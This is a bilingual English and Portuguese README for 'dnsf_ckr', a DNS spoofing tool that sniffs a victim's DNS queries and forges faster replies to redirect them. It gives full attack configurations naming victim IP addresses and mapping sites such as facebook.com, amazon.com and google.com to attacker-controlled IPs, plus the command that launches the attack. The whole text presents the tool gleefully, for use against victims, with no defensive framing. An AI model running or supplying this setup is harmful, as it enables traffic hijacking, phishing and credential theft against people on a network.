Dnsf_ckr
--------

(sorry my bad english...)

dnsf_ckr is a application used for messing up with domain names.

The idea here is sniffing victim's dns requests and fake the response as soon as possible than real dns server.
In this way is possible redirect the target machine to anywhere we want.

MuHAuHaUHauHAuHAHuha! :)

## Using dnsf_ckr

At first you need to know about two things

    * The victim's ip address
    * Which domain names you wish to spoof

These informations must be supplied to dnsf_ckr through a configuration file.

Suposing that yours victim is called "sheep" and has the ip address "192.30.70.9" and accesses the "www.facebook.com",
we have the following attack configuration:

        # dnsf_ckr attack config sample

        # at first, you have to declare your victim alias

        victims =
            sheep: 192.30.70.9
        ;

        # and so, the domain that your victim access which you want to spoof, in form <domain>:<spoofed-ip>

        namelist boring-sites-of-boring-people =
            www.facebook.com: 192.30.70.101
        ;

        # finally, you inform your intentions to dnsf_ckr

        fake-nameserver =
            with sheep mess up boring-sites-of-boring-people
        ;


Okay, now you want to add a new attack based on a new victim and directing the "sheep" for others wilder domains too:


        victims = 
            sheep: 192.30.70.9
            obama: 192.30.70.21
        ;

        namelist boring-sites-of-boring-people =
            www.facebook.com: 192.30.70.101
        ;

        namelist webcommerce-sites =
            www.amazon.com: 192.30.70.101
            www.buy-buy-baby-buy-buy.com: 192.30.70.101
            www.good-buy.com: 192.30.70.101
        ;

        namelist search-engines =
            www.bing.com: 192.30.70.102
            www.google.com: 192.30.70.101
            www.goduck.com: 192.30.70.103
        ;

        fake-nameserver =
            with sheep mess up boring-sites-of-boring-people, webcommerce-sites
            with obama mess up search-engines
        ;

Now, if all this presented data has been into "my-dirty-little-hacking.conf" file all we need to do is:

        ./dnsf_ckr my-dirty-little-hacking.conf


Have fun!
Rafael :)


Dnsf_ckr
--------

dnsf_ckr e uma aplicacao usada para baguncar com os dominios.

A ideia aqui e sniffar as requisicoes dns da vitima e forjar a resposta o quanto antes em relacao ao servidor dns real.
Dessa forma e possivel redirecionar a maquina alvo para onde nos quisermos.

MuHAuHaUHauHAuHAHuha! :)

## Usando o dnsf_ckr

Para comecar voce precisa saber de duas coisas

    * O endereco ip da vitima
    * Quais nomes de dominio voce deseja spoofar

Essas informacoes devem ser informadas para o dnsf_ckr por meio de um arquivo de configuracao.

Supondo que sua vitima se chama "ovelha" e possui o ip "192.30.70.9" e acessa "www.facebook.com",
teriamos a seguinte configuracao de ataque:

        # dnsf_ckr attack config sample

        # at first, you have to declare your victim alias

        victims =
            sheep: 192.30.70.9
        ;

        # and so, the domain that your victim access which you want to spoof, in form <domain>:<spoofed-ip>

        namelist boring-sites-of-boring-people =
            www.facebook.com: 192.30.70.101
        ;

        # finally, you inform your intentions to dnsf_ckr

        fake-nameserver =
            with sheep mess up boring-sites-of-boring-people
        ;


Ok, agora voce quer adicionar um novo ataque para uma nova vitima, alem de direcionar a "ovelha" para outros dominios
mais selvagens:

        victims = 
            sheep: 192.30.70.9
            obama: 192.30.70.21
        ;

        namelist boring-sites-of-boring-people =
            www.facebook.com: 192.30.70.101
        ;

        namelist webcommerce-sites =
            www.amazon.com: 192.30.70.101
            www.buy-buy-baby-buy-buy.com: 192.30.70.101
            www.good-buy.com: 192.30.70.101
        ;

        namelist search-engines =
            www.bing.com: 192.30.70.102
            www.google.com: 192.30.70.101
            www.goduck.com: 192.30.70.103
        ;

        fake-nameserver =
            with sheep mess up boring-sites-of-boring-people, webcommerce-sites
            with obama mess up search-engines
        ;

Agora, se todos esses dados apresentandos estiverem dentro do arquivo "my-dirty-little-hacking.conf" tudo o que precisamos fazer:

        ./dnsf_ckr my-dirty-little-hacking.conf


Boa diversao!
Rafael :)
